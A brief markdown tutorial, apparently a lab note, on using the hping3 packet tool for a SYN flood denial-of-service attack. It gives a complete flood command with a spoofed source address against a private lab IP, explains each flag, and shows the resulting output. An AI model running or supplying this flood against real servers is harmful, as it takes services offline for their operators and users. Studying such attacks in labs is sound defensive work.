## Deniel of Service Attack [hping3]

<img src="https://www.kali.org/tools/hping3/images/hping3-logo.svg" style="width:120px;"/>


`hping3` is a network tool able to send custom TCP/IP packets and to display target replies like ping program  does  with  ICMP  replies. hping3 handle fragmentation, arbitrary packets body and size and can be used in order to transfer files encapsulated under supported protocols

`hping3` can be used to perform DoS SYN flood attack \
A SYN flood (half-open attack) is a type of denial-of-service (DDoS) attack which aims to make a server unavailable to legitimate traffic by consuming all available server resources. By repeatedly sending initial connection request (SYN) packets

--

1- Perform a DoS Attack
`sudo hping3 -S 192.168.70.6 -p 445 -a 192.168.70.8 --flood`

- `-S` send SYN packets
- `192.168.70.6` the target host
- `-p` specify the target port
- `-a` the spoofed host
- `--flood` Sent packets as fast as possible without waiting for reply.

```
HPING 192.168.70.6 (eth0 192.168.70.6): S set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown


--- 192.168.70.6 hping statistic ---
3434550 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
```
